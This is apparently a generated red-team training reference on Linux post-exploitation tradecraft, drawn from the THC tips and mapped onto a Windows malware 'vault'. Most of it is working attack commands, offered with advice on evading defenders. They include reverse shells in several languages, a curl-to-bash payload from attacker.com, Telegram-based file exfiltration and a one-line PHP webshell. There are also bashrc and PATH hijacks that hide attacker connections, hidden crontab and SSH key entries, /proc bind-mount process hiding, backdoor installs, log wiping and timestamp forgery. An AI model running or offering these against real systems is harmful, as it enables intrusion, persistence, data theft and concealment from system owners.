---
id: RTO-thc-shell-tradecraft
name: THC Shell Tradecraft & Linux Operations
source: Red Team Ops / Zero-Point Security (THC Tips Compilation)
category: c2-infrastructure
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-022, T-019, T-016, T-020, T-023, T-021, T-017]
tags: [linux, shell-tradecraft, pivoting, ssh, exfiltration, reverse-shell, backdoor, anti-forensics, opsec, socks5, tunneling, session-hijack]
---

# THC Shell Tradecraft & Linux Operations — Training Reference

## TL;DR
The THC Tips compilation is a Linux-side counterpart to the vault's Windows tradecraft. It covers shell OPSEC (history suppression, process/connection hiding via `exec -a`, `bashrc` hijacks, `/proc` bind-mounts), SSH pivoting (ProxyJump, master mux, SOCKS4/5), file transfer/exfil across constrained environments, reverse shell one-liners across 7+ runtimes, and lightweight backdoors (gs-netcat, userland sshd, LD_PRELOAD rootkits, DNS tunnels). 

## Key Concepts

1. **Shell OPSEC baseline (Hackshell)** — Disable `~/.bash_history`, `LESSHISTFILE`, `MYSQL_HISTFILE`, `REDISCLI_HISTFILE`; set `TMPDIR` to `/dev/shm` (RAM-backed); prepend `.` to `PATH`. Equivalent in spirit to vault T-020 self-deletion and T-016 PEB unlink — the goal is the same: leave no forensic trail of operator activity on the host.

2. **Process name spoofing via `exec -a`** — Bash builtin `exec -a NAME CMD` rewrites `argv[0]` so `ps`/`/proc/PID/comm` show an attacker-chosen string. The vault's analogue on Windows is T-016 PPID spoofing + arg spoofing (T-016 `arg_spoof.rs`); both techniques lie about the identity of a running malicious process to defeat process-tree telemetry.

3. **Command-line option wiping (Zapper)** — A userspace binary wrapper that strips `argv` after `execve`, leaving only the spoofed `argv[0]`. Conceptually identical to vault T-016 argument spoofing (rebuilding `argv` post-launch so EDR's `NtQueryInformationProcess(P0)`/`ProcessBasicInformation` walk sees benign arguments).

4. **Connection hiding via shell-function hijack** — Override `netstat`/`ss`/`ps`/`lsof`/`ls` in `~/.bashrc` or via a planted binary in `/usr/local/sbin` (which precedes `/usr/bin` in default Debian PATH). Filters out attacker IPs/ports using `grep -Fv`. Linux equivalent of vault T-016 PEB unlink and handle-blocking (`block_handle.rs`) — both hide attacker artifacts from monitoring tools, but on Linux the attack surface is the shell's PATH/resolution order rather than the PEB Ldr list.

5. **Rootkit-less process hiding via `/proc` bind-mount** — `mount -n --bind /dev/shm /proc/$PID` over-mounts the process's proc entry, hiding it from `ps`, `lsof`, `top`, and most userland monitors without loading a kernel module. The vault's closest analogue is T-020 anti-analysis (`anti_vm.rs`) and T-016 PEB unlink — different mechanism, same goal of evading host enumeration.

6. **ANSI escape / carriage-return file obfuscation** — `\033[2K\033[1A` (line-erase + cursor-up) or `\r` (carriage return) hide lines from `cat`, `tail`, and naive parsers. Useful for planting cron entries, ssh keys, or `bashrc` lines that survive cursory inspection. No direct vault equivalent; the closest is compile-time string obfuscation in T-021 (`obf/src/lib.rs`), but applied at rest rather than in-binary.

7. **SSH master multiplexing** — `ssh -M -S .sshmux` establishes one TCP connection; subsequent `ssh -S .sshmux NONE` sessions piggyback without re-auth. Reduces connection telemetry and authentication noise. No direct vault equivalent; the closest is T-022 juubi.rs peer-relay connection reuse — both minimize visible network activity for multi-session operators.

8. **SSH ProxyJump chaining** — `ssh -J hop1,hop2,...,target` tunnels an end-to-end SSH session through multiple intermediates without spawning shells on them. Equivalent to vault T-022 `juubi.rs` peer relay and `rikudo.rs` multi-chain vault — both implement multi-hop encapsulation; the vault does it for arbitrary TCP, SSH does it natively for SSH only.

9. **Dynamic SOCKS pivoting** — `ssh -D 1080 user@pivot` exposes a SOCKS4/5 listener locally; `ssh -g -R 1080` exposes it on the remote side. Directly paralleled by vault T-022 `kamui.rs` (SOCKS5 proxy) — the vault's implementation is a custom protocol; SSH's is native and operationally simpler on Linux targets.

10. **Self-extracting implant / `memexec`** — Deploy a backdoor without touching the filesystem: pipe a payload through `memfd_create` (or `/dev/shm` with bind-mounts) so it never appears on disk. Direct Linux analogue of vault T-007 Process Hollowing/Mapping, T-009 Process Ghosting (delete-pending execution), and T-010 Herpaderping (file content race) — all aim to execute code without leaving a recoverable disk artifact.

## Operational Techniques

### Hackshell (Silent Bash Environment)
- **What**: One-liner that disables shell history, less/mysql/redis logs, sets RAM-backed TMPDIR, and installs a hostile-PS1.
- **When to use**: Every interactive landing on a Linux target before any further commands.
- **How**:
  1. `source <(curl -SsfL https://thc.org/hs)` — preferred when outbound HTTPS is open.
  2. If no curl/wget: use `surl` (see Download section) to fetch the script, then `source` it locally.
  3. Bonus: prefix any sensitive command with a leading space — bash `HISTCONTROL=ignorespace` will not record it.
- **Vault link**: T-020 (`self_delete.rs`, `iat_camo.rs`) — spirit of zero-forensic-footprint. Windows equivalent would be clearing `HKCU\...\BashHistory`-equivalent event logs, but the vault does not implement a "shell bootstrap" routine; this complements it.
- **Tool/code**: `hackshell.sh`, `unset HISTFILE`, `export LESSHISTFILE=-`, `stty cols 400`.
- **OPSEC**: Loading `hackshell.sh` over HTTPS leaks the fetch to network IDS unless your C2 is on the same egress. Pre-stage the script in `/dev/shm` and source locally when possible.

### Process Name Spoofing via `exec -a`
- **What**: Override `argv[0]` of a child process to impersonate a benign daemon (`syslogd`, `sshd`, `kworker`).
- **When to use**: Any long-running malicious process (nmap scan, relay, keylogger) on a host where defenders may glance at `ps`.
- **How**:
  ```sh
  (exec -a syslogd nmap -Pn -F -n --open -oG - 10.0.2.1/24)        # foreground
  (exec -a '/usr/sbin/sshd' nmap ... &>nmap.log &)                # background daemon
  screen -dmS MyName nmap ...                                       # GNU screen alt
  ```
  Bind-mount alternative (root only):
  ```sh
  mount -n --bind "$(command -v nmap)" /sbin/init
  /sbin/init -Pn -f -n --open -oG - 10.0.2.1/24
  ```
- **Vault link**: T-016 arg spoofing (`arg_spoof.rs`) — vault rebuilds `argv` post-`CreateProcessW` via `NtQueryInformationProcess`; both defeat `ps`/Process Explorer-style enumeration of command lines but at different layers.
- **Tool/code**: bash `exec -a`, GNU `screen -dmS`, `mount --bind`.
- **OPSEC**: `exec -a` does not change `/proc/PID/exe` (symlink to real binary) — defenders running `ls -l /proc/*/exe` will catch you. Use the bind-mount variant or `zapper` for full cover.

### Zapper (Command-Line Wiping)
- **What**: A small binary wrapper that, after `fork+execve`, zeroes the `argv` array so the child's command line reads only the spoofed name.
- **When to use**: When `ps -ef`/`/proc/PID/cmdline` would otherwise expose suspicious flags (`-e ssh`, `--reverse`, etc.).
- **How**:
  ```sh
  curl -fL -o zapper https://github.com/hackerschoice/zapper/releases/latest/download/zapper-linux-$(uname -m)
  chmod 755 zapper
  ./zapper -a klog nmap -Pn -F -n --open -oG - 10.0.0.1/24
  (./zapper -a 'sshd: root@pts/0' nmap ... &>nmap.log &)
  exec ./zapper -f -a'[kworker/1:0-rcu_gp]' tmux   # replace shell + hide tmux+children
  ```
- **Vault link**: T-016 arg spoofing — same outcome, different OS layer. The vault reconstructs `argv` after `CreateProcessW` using `RTL_USER_PROCESS_PARAMETERS`; zapper overwrites `argv` post-`execve` in Linux's `mm_struct`.
- **Tool/code**: `zapper` binary, flag `-a NAME` (set argv[0]), `-f` (foreground/replace shell).
- **OPSEC**: `/proc/PID/exe` still points to `zapper` itself. Copy/rename the `zapper` binary first (e.g., to `/dev/shm/klog`) or run via bind-mount to defeat this.

### Network Connection Hiding (netstat/ss Hijack)
- **What**: Filter attacker IPs/ports from `netstat`/`ss` output by hijacking the binary via `bashrc` function or `PATH` ordering.
- **When to use**: Long-lived reverse shells or backdoors that would otherwise appear in netstat output.
- **How**:
  - **Method 1 (bashrc function)**:
    ```sh
    echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc
    touch -r /etc/passwd ~/.bashrc
    ```
  - **Method 2 (obfuscated bashrc line)** — hex-encode the function so a `grep netstat ~/.bashrc` doesn't find it:
    ```sh
    X='netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }'
    echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG" >>~/.bashrc
    touch -r /etc/passwd ~/.bashrc
    ```
  - **Method 3 (PATH hijack)** — plant `/usr/local/sbin/netstat` (before `/usr/bin` in default PATH):
    ```sh
    echo '#! /bin/bash
    exec /usr/bin/netstat "$@" | grep -Fv -e :22 -e 1.2.3.4' >/usr/local/sbin/netstat
    chmod 755 /usr/local/sbin/netstat
    touch -r /usr/bin/netstat /usr/local/sbin/netstat
    ```
- **Vault link**: T-016 PEB unlink + block handle (`block_handle.rs`) — both prevent monitoring APIs from returning attacker-controlled artifacts. Vault manipulates PEB Ldr lists and `NtQuerySystemInformation` filter; THC manipulates `bashrc`/`PATH`. Same principle: hijack the enumerator before it sees the artifact.
- **Tool/code**: `grep -Fv`, `xxd -ps`, `touch -r`.
- **OPSEC**: The `touch -r /etc/passwd ~/.bashrc` preserves mtime — defenders diffing by mtime won't see the change. Local users comparing `~/.bashrc` against a known-good copy will. Method 3 requires write to `/usr/local/sbin` (root).

### Process Hiding (User-Level — bashrc override)
- **What**: Override `ps` in `~/.bashrc` to filter attacker process names.
- **When to use**: Same as connection hiding, complementary defence-in-depth.
- **How**:
  ```sh
  echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap -e GREP; }' >>~/.bashrc
  touch -r /etc/passwd ~/.bashrc
  ```
  The `exec -a GREP` renames the filtering `grep` so it doesn't appear in `ps` output as `grep nmap`.
- **Vault link**: T-016 PEB unlink — vault removes the loaded-module entry from `Ldr.InLoadOrderModuleList` so enumeration APIs skip it; THC removes the process from `ps`'s output stream.
- **Tool/code**: `exec -a GREP`, `grep -Fv`.
- **OPSEC**: Defeats only interactive `ps` inspection. `top`, `htop`, `/proc` direct walk, `auditd`, and EDR-grade monitors bypass this entirely. Pair with root-level `/proc` bind-mount.

### Process Hiding (Root-Level — `/proc` Bind-Mount)
- **What**: Over-mount `/proc/$PID` with `/dev/shm` so the PID disappears from `/proc` enumeration.
- **When to use**: Root-level long-lived backdoors that must survive `ps -ef`, `lsof`, `top`, and C_panel-based discovery.
- **How**:
  ```sh
  hide() {
      [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
      _pid=${1:-$$}
      [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
      local _argstr
      for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
      [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
      bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
  }
  hide                  # hide current shell
  hide 31337            # hide PID 31337
  hide sleep 1234       # launch + hide
  hide nohup sleep 1234 &>/dev/null &   # background + hide
  ```
- **Vault link**: T-020 anti-VM/anti-analysis (`anti_vm.rs`, `hammering.rs`) and T-016 PEB unlink — all reduce visibility to host-level enumerators. The vault's Windows approach (PEB unlink) does not have a true equivalent on Linux because Linux has no PEB; the bind-mount is the closest functional analogue.
- **Tool/code**: `mount -n --bind`, `/dev/shm`, `/etc/mtab` fix (when symlinked to `/proc/self/mounts`).
- **OPSEC**: Requires root and `CAP_SYS_ADMIN`. The `mount` itself is logged if `/etc/mtab` is a real file (handled by the function's mtab-replace trick). Auditd's `bind` syscall audit will catch this — disable `auditd` or use a kernel rootkit if needed.

### ANSI/CR File Obfuscation
- **What**: Hide lines in `~/.bashrc`, `crontab`, or `authorized_keys` from `cat`, `tail`, `head`, and other line-printers using terminal escape sequences.
- **When to use**: Planting persistence entries that should not be visible to a casual admin running `cat ~/.bashrc` or `crontab -l`.
- **How**:
  ```sh
  # Hide last command in ~/.bashrc:
  echo -e "id #\\033[2K\\033[1A" >>~/.bashrc

  # Hidden crontab line:
  (crontab -l; echo -e "0 2 * * * { id; date;} 2>/dev/null >/tmp/.thc-was-here #\\033[2K\\033[1A") | crontab

  # Hide ssh key from 'cat authorized_keys':
  echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >authorized_keys
  ```
- **Vault link**: No direct equivalent. T-021 string obfuscation (`obf/src/lib.rs`) is compile-time in-binary; this is at-rest file obfuscation. 
- **Tool/code**: `echo -e`, `\033[2K` (erase line), `\033[1A` (cursor up), `$'\r'`.
- **OPSEC**: Defeated by `cat -A`, `xxd`, `sed -n p`, `grep`, `awk`, or any tool that doesn't honor ANSI escape sequences. Use as defence-in-depth, not primary concealment.

### Parallel Execution with Per-Task Logging
- **What**: `xargs -P N --process-slot-var=SLOT` runs N workers in parallel, each with a unique `SLOT` variable for log segregation.
- **When to use**: Mass enumeration (nmap scans, linpeas on many hosts) where serial execution is too slow.
- **How**:
  ```sh
  cat hosts.txt | xargs -P20 -I{} --process-slot-var=SLOT bash -c \
    'exec nmap -n -Pn -sV -F --open -oG - {} >>"nmap_${SLOT}.txt"'

  # linpeas on 40 gsocket hosts, separate error log per slot:
  cat secrets.txt | xargs -P40 -I{} --process-slot-var=SLOT bash -c \
    'mkdir host_{}; gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>>"linpeas-${SLOT}.err"'
  ```
- **Vault link**: T-022 juubi_chain.rs peer relay chain management — vault uses parallel relay management for high-throughput C2; THC's pattern is for mass host action.
- **Tool/code**: `xargs -P -I -process-slot-var`, `exec` (replace shell with final binary).
- **OPSEC**: 40 concurrent outbound SSH sessions from one host may trip netflow anomaly detection. Stagger or use separate source IPs via `proxychains` if needed.

### Almost-Invisible SSH
- **What**: SSH without writing `known_hosts`, without appearing in `w`/`who` (no PTY allocation), with a hostile-prompt bootstrap.
- **When to use**: Interactive shells on targets where utmp/wtmp must remain clean.
- **How**:
  ```sh
  ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
  ```
  Full pimped version (PTY + colors + hackshell hint):
  ```sh
  xssh() {
      local ttyp="$(stty -g)"
      stty raw -echo icrnl opost
      [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
      ssh -oConnectTimeout=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking="${a:-accept-new}" -T \
          "$@" \
          "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [uid] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null"
      stty "${ttyp}"
  }
  ```
- **Vault link**: T-019 Edo Dead Drop (`discovery.rs` for server URL discovery) — both minimize forensic trace of operator connections. Vault uses blockchain/rentry for autonomous discovery; SSH here assumes you already know the target.
- **Tool/code**: `ssh -T`, `UserKnownHostsFile=/dev/null`, `exec -a [uid] script -qc`.
- **OPSEC**: `-T` disables PTY, so interactive shells (`vi`, `top`) won't work without the `script -qc` wrapper shown. `known_hosts` is written nowhere — but the SSH key fingerprint still appears in server-side `auth.log`.

### SSH Master Multiplexing
- **What**: One TCP/SSH connection serves multiple shell sessions without re-authentication.
- **When to use**: Long engagements on a single target — multiple shells, scp transfers, tunnelled ports all over one TCP 5-tuple to reduce network footprint.
- **How**:
  ```sh
  ssh -M -S .sshmux user@server.org          # master
  ssh -S .sshmux NONE                         # slave session (no password)
  scp -o "ControlPath=.sshmux" NONE:/etc/passwd .
  ```
- **Vault link**: T-022 `juubi.rs` peer relay + `kamui.rs` SOCKS5 — both multiplex logical sessions over a single transport; the vault's protocol is custom binary, SSH's is RFC 4253 channel multiplexing.
- **Tool/code**: `ssh -M -S`, `ControlPath=` option.
- **OPSEC**: Reduces authentication events in `auth.log` from N to 1. The single long-lived TCP connection may itself be a fingerprint if defenders profile connection duration distributions.

### SSH Forward / Reverse Tunnel
- **What**: Local or remote port forwarding through SSH to bypass firewalls / expose internal services.
- **When to use**: Reaching internal services from a pivot, or exposing local services to the pivot side.
- **How**:
  ```sh
  # Local forward — anyone connecting to my :31337 reaches 1.2.3.4:80 via server.org:
  ssh -g -L31337:1.2.3.4:80 user@server.org

  # Reverse forward — anyone on server.org:31338 reaches my 192.168.0.5:80:
  ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org

  # Interactive tunnel creation without reconnection:
  # inside an existing ssh session, press ~C, then:
  -L31337:1.2.3.4:80
  ```
- **Vault link**: T-022 kamui.rs SOCKS5 + juubi.rs peer relay — vault implements equivalent functionality in Rust for arbitrary protocols; SSH provides it natively on any Linux host with OpenSSH.
- **Tool/code**: `ssh -L`, `ssh -R`, `-g` (GatewayPorts), `~C` (interactive escape).
- **OPSEC**: `-g` (GatewayPorts) makes the listener bind to all interfaces — visible to other hosts. Use without `-g` for loopback-only. `ExitOnForwardFailure=yes` prevents the SSH session from establishing if the forward fails (cleaner exit than half-broken sessions).

### SSH SOCKS4/5 Tunnel
- **What**: SSH exposes a SOCKS proxy — all client traffic routed through the SSH endpoint.
- **When to use**: Pivoting through a single compromised host to reach arbitrary internal hosts/ports.
- **How**:
  ```sh
  # Local SOCKS — my 127.0.0.1:1080 becomes a SOCKS proxy via server.org:
  ssh -D 1080 user@server.org
  # configure browser/curl/proxychains to socks5://127.0.0.1:1080

  # Reverse SOCKS — server.org:1080 becomes a SOCKS proxy reaching my LAN:
  ssh -g -R 1080 user@server.org
  ```
- **Vault link**: T-022 kamui.rs — vault's SOCKS5 implementation (`src/kamui.rs`). SSH's native SOCKS is operationally preferable on Linux targets; the vault's is preferable when you've planted dark_crystal/client_rust on Windows.
- **Tool/code**: `ssh -D 1080`, `curl -x socks5h://127.0.0.1:1080 ...`, `proxychains`.
- **OPSEC**: SOCKS over SSH is recognisable by deep packet inspection on the SSH endpoint (encrypted, but the connection pattern is anomalous). Stunnel or domain-fronting may be needed in strict environments.

### SSH to NATed Host via ssh-j.com Relay
- **What**: A reverse-tunnel relay service for hosts behind NAT/firewall, with a one-line bootstrap and arbitrary tunnel IDs.
- **When to use**: Target sits behind NAT and cannot accept inbound SSH; you don't control a pivot.
- **How**:
  ```sh
  sshj() {
      local pw=${1,,}
      [[ -z $pw ]] && { pw=$(head -c64 </dev/urandom | base64 | tr -d -c a-z0-9); pw=${pw:0:12}; }
      echo "Press Ctrl-C to stop this tunnel."
      echo -e "To ssh to ${USER:-root}@${2:-127.0.0.1}:${3:-22} type: \e[0;36mssh -J ${pw}@ssh-j.com ${USER:-root}@${pw}\e[0m"
      ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes ${pw}@ssh-j.com -N -R ${pw}:22:${2:-0}:${3:-22}
  }
  sshj                                  # random ID
  sshj foobarblahblub                   # specific ID, default 127.0.0.1:22
  sshj foobarblahblub 192.168.0.1 2222  # tunnel to LAN host
  ```
  Connect from anywhere:
  ```sh
  ssh -J foobarblahblub@ssh-j.com root@foobarblahblub
  ```
- **Vault link**: T-019 Edo Dead Drop (`edo_dead_drop.rs`) — both achieve autonomous C2 reach for hosts that can't accept inbound. Vault uses Google Translate / Ethereum TX / steganography; THC uses a free public relay. Vault's is harder to block (uses legitimate services); THC's is simpler but `ssh-j.com` is a known IOC.
- **Tool/code**: `ssh-j.com`, `ssh -J`, `ssh -R`.
- **OPSEC**: `ssh-j.com` is a public relay — its IP/domain appears in the target's `auth.log` and outbound connection logs. Treat as opportunistic only; for production C2 use your own infrastructure or the vault's dead-drop.

### SSH ProxyJump (Multi-Hop Pivoting)
- **What**: End-to-end SSH session through N intermediate hops without spawning shells on the intermediates.
- **When to use**: Multi-segment pivot (workstation → DMZ → internal jump → target) where credentials must not touch the intermediates.
- **How**:
  ```sh
  # $local-kali → $C2 → $internal-jumphost → $target-host
  ssh -J c2@10.25.237.119,jumpuser@192.168.5.135 target@172.16.2.121

  # SSH to internal-jumphost only (skipping target):
  ssh -J c2@10.25.237.119 jumpuser@192.168.5.135
  ```
  In `~/.ssh/config`:
  ```
  Host target
      HostName 172.16.2.121
      User target
      ProxyJump c2@10.25.237.119,jumpuser@192.168.5.135
  ```
- **Vault link**: T-022 juubi_chain.rs (peer relay chain) + rikudo.rs (multi-chain vault) — vault's multi-hop encapsulation for arbitrary TCP traffic; SSH ProxyJump does it natively for SSH only. Both achieve credential/transport isolation from intermediates.
- **Tool/code**: `ssh -J hop1,hop2,...,target`, `ProxyJump` config directive.
- **OPSEC**: Each hop logs the connection on its local sshd. End-to-end encryption means hops cannot read credentials, but they can correlate timing and volume.

### User-Land SSHD
- **What**: Run an SSH server as non-root user, on a non-privileged port, with a throwaway host key.
- **When to use**: Need to multiplex/forward TCP off a host where root SSHD forbids `AllowTcpForwarding`/`GatewayPorts`; or need a quick exfil-dump-server under a user context.
- **How**:
  ```sh
  # On the target, as user 'joe':
  mkdir -p ~/.ssh
  ssh-keygen -q -N "" -t ed25519 -f sshd_key
  cat sshd_key.pub >>~/.ssh/authorized_keys
  $(command -v sshd) -f /dev/null -o HostKey=$(pwd)/sshd_key -o GatewayPorts=yes -p 31337

  # On the client (copy sshd_key):
  ssh -D1080 -R31339:0:31339 -i sshd_key -p 31337 joe@1.2.3.4
  curl -x socks5h://0 ipinfo.io
  ```
- **Vault link**: T-019 Edo Dead Drop + T-022 kamui.rs/juubi.rs — same functional role (user-space TCP multiplexing/exfil); the vault implements it in Rust with custom protocol; THC uses native sshd.
- **Tool/code**: `sshd -f /dev/null -o HostKey=... -o GatewayPorts=yes -p 31337`.
- **OPSEC**: `-f /dev/null` skips all system SSHD config (so no `ForceCommand`/`ChrootDirectory` applies). Port 31337 is a classic IOC; pick something unremarkable like 5432 (Postgres) or 6379 (Redis). The host key file (`sshd_key`) in `~/.ssh` is unusual — defenders comparing directory listings will spot it.

### File Transfer via Cut & Paste / tmux / screen
- **What**: Move files between two terminals when no network channel is available — encode to base64/xxd, paste, decode.
- **When to use**: Air-gapped terminal sessions, restricted shells with no `curl`/`scp`, VNC clipboard only.
- **How**:
  ```sh
  # Source side — encode and emit:
  base64 <binary_file> | xxd -ps -c1024   # or just: base64 -w0 <file>
  # or for paste-resilience:
  gzip -c <file> | base64 -w0

  # Destination side — paste the encoded blob, then decode:
  echo "PASTED_BLOB" | base64 -d | gzip -d > file
  ```
  tmux-specific: `tmux save-buffer -` / `tmux load-buffer -`.
  GNU screen-specific: `screen -X hardcopy` and paste from `~/.hardcopy`.
- **Vault link**: T-023 amaterasu.rs (exfiltration engine) — vault has structured exfil over its C2 protocol; THC's clip-board trick is for last-resort manual transfers when no protocol is available.
- **Tool/code**: `base64`, `gzip`, `xxd -ps`, `tmux save-buffer`, `screen -X hardcopy`.
- **OPSEC**: No network footprint. Base64 of a 1MB binary is ~1.4MB pasted text — clipboards of some terminals truncate. Use chunks of ≤4KB and concatenate.

### File Download Without curl/wget (surl)
- **What**: Pure-bash HTTP fetch using `/dev/tcp` or Python one-liners, when `curl`/`wget` are absent.
- **When to use**: Stripped appliances, embedded systems, restricted shells.
- **How**:
  ```sh
  # Pure bash (works when /dev/tcp is available):
  exec 3<>/dev/tcp/example.com/80
  printf 'GET /file HTTP/1.0\r\nHost: example.com\r\n\r\n' >&3
  cat <&3 > response          # then strip HTTP headers manually

  # Inline python (more robust):
  python -c "import urllib2; open('/tmp/file','wb').write(urllib2.urlopen('http://example.com/file').read())"

  # THC's surl tool — paste the surl snippet, it fetches the URL via bash /dev/tcp.
  ```
- **Vault link**: T-020 winhttp_dl.rs (WinHTTP staged download) — vault's Windows equivalent. The Linux analog uses `/dev/tcp` or Python.
- **Tool/code**: `/dev/tcp/host/port`, `python -c urllib2`, `surl` snippet.
- **OPSEC**: Plain HTTP (no TLS) over `/dev/tcp` is visible in plaintext to network IDS. For HTTPS, use Python with `ssl` context.

### File Transfer to Telegram (Exfil)
- **What**: Use Telegram Bot API as an exfil channel — POST files to a bot chat.
- **When to use**: Hard egress filtering — Telegram's IPs/domains are commonly allowlisted; the bot token is the only credential.
- **How**:
  ```sh
  TOKEN="BOT_TOKEN"; CHAT="CHAT_ID"
  curl -s -F "document=@file.zip" "https://api.telegram.org/bot${TOKEN}/sendDocument?chat_id=${CHAT}"
  ```
- **Vault link**: T-019 Edo Dead Drop (`edo_dead_drop.rs` — uses Google Translate, blockchain, steganography for autonomous C2) and T-023 amaterasu.rs (exfil). Telegram-as-dead-drop is a natural extension of the vault's "abuse legitimate services" pattern.
- **Tool/code**: `curl -F document=@file.zip`, `api.telegram.org/bot<TOKEN>/sendDocument`.
- **OPSEC**: Telegram rate-limits large files (~50MB max). The bot token, if leaked, exposes all exfil content. Rotate tokens per engagement. The Telegram metadata (sender ID, timestamps) is preserved server-side and subpoenable.

### Reverse Shell One-Liners
- **What**: Bash, cURL, OpenSSL, Python, Perl, PHP reverse shells.
- **When to use**: Post-RCE / post-credential to establish interactive presence.
- **How**:
  - **Bash** (no `/dev/tcp` fallback): `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`
  - **cURL encrypted** — `curl https://attacker.com/sh | bash` over HTTPS, then the shell process is the cURL child.
  - **OpenSSL encrypted**:
    ```sh
    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect IP:PORT > /tmp/s
    ```
  - **Python**: `python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("IP",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'`
  - **Perl**: similar pattern with `IO::Socket::INET`.
  - **PHP**: `php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`
- **Vault link**: T-019 Edo Dead Drop discovery.rs (server URL discovery) — both bootstrap operator-to-implant channel. The vault does this via structured C2; THC does it via throwaway one-liners for immediate post-exploitation.
- **Tool/code**: `/dev/tcp`, `mkfifo`, `openssl s_client`, `fsockopen`, `socket.connect`.
- **OPSEC**: Plain `bash -i >& /dev/tcp` is plaintext on the wire — always wrap in OpenSSL or use a TLS proxy. Most reverse-shell PTY upgrades (PTY + `stty raw`) leave a "weird" env that `who`/`w` may still log.

### Upgrading Dumb Shell to Fully Interactive
- **What**: Convert a non-PTY reverse shell into a fully interactive shell with job control, `vi`, `su` support.
- **When to use**: After landing a one-liner reverse shell, before running interactive tools.
- **How**:
  ```sh
  # PTY upgrade on target:
  python -c 'import pty; pty.spawn("/bin/bash")'
  # or
  socat exec:/bin/bash,pty,stderr,setsid,sigint,echo raw TERM=xterm-256color

  # On attacker side, raw terminal:
  stty raw -echo; fg
  # then on target:
  export TERM=xterm-256color
  stty rows 60 cols 160

  # Full socat-to-socat interactive (no python needed):
  # attacker: socat file:`tty`,raw,echo=0 TCP-LISTEN:PORT
  # target:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:IP:PORT
  ```
- **Vault link**: T-023 client_rust shell capabilities (no direct vault impl for Linux PTY upgrade; the vault targets Windows). 
- **Tool/code**: `python -c pty.spawn`, `socat exec:/bin/bash,pty,...`, `stty raw -echo`, `export TERM=`.
- **OPSEC**: PTY-spawned bash writes entries to `utmp`/`wtmp` — appears in `w`/`who`. Pair with `xssh`-style `-T` (no utmp) if possible. `socat` is rarely present on minimal systems — pre-stage or use the python variant.

### Backdoors
- **What**: Long-term access implants: `gs-netcat` (encrypted backdoor + multiplexer), `sshx.io` (collab shell), small SSHD backdoor, PHP webshell, DNS-tunnel backdoor, LD_PRELOAD rootkit, self-extracting in-memory implant.
- **When to use**: Persistence on Linux targets; each variant suits a different scenario (encrypted, web-facing, NATed, library-injection).
- **How** (selected):
  - **gs-netcat**: `curl -fsSL https://gsocket.io/install.sh | bash` then `gs-netcat -i -s <secret> -p <port>` — appears as `gs-netcat` process; relays via global GSocket overlay.
  - **Smallest PHP backdoor**: `<?=`$_GET[0]`?>` — 13 chars, evaluates `?0=system("id");`.
  - **Reverse DNS-tunnel backdoor**: Queries attacker-controlled DNS domain with `subdomain = base32(data)`. Bypasses egress filters that allow UDP/53.
  - **LD_PRELOAD rootkit**: Shared object loaded via `/etc/ld.so.preload` that hooks `readdir`, `open`, `stat` to hide attacker files/PIDs.
  - **Self-extracting implant (memexec pattern)**: Binary unpacks payload into `memfd_create` → `execve` — no filesystem artifact.
- **Vault link**: T-017 Five-Layer Persistence Suite (COM hijack, NTFS EA, schtask, TLS callback, PhantomPersist) + T-018 Edo Tensei (polymorphic resurrection) + T-019 Edo Dead Drop — all persistence/resurrection on Windows. THC's variants are the Linux functional equivalents. The `memexec` self-extractor maps directly to vault T-007 process hollowing + T-009 process ghosting concepts.
- **Tool/code**: `gsocket.io/install.sh`, `gs-netcat`, `<?=`$_GET[0]`?>`, `ld.so.preload`, `memfd_create`.
- **OPSEC**: LD_PRELOAD is visible via `/proc/PID/maps` and `ltrace`. DNS-tunnel backdoors generate anomalous DNS query volume — throttled and shaped to look like legitimate lookups. PHP `<?=`$_GET[0]`?>` evades most string-based webshell scanners but fails on semantic AST analysis.

### Anti-Forensics: Shred, Timestamps, Logs, Hidden Files
- **What**: Secure-delete, restore mtime/ctime, clean logfiles, hide files without root.
- **When to use**: Post-engagement cleanup, or pre-emptive hiding of tools/loot.
- **How**:
  ```sh
  shred -uvz -n 3 file                # overwrite 3× + final zero + unlink
  touch -r /etc/passwd /tmp/evil      # copy mtime from a benign file
  echo > /var/log/wtmp                # truncate logs (destructive, noisy)
  chattr +i /etc/passwd               # make immutable (root)
  ```
  Hide files from a non-root user:
  ```sh
  mkdir -p -- '...'                    # name is just three dots, easy to miss
  mkdir -p -- $'\t'                     # tab character as dirname
  ```
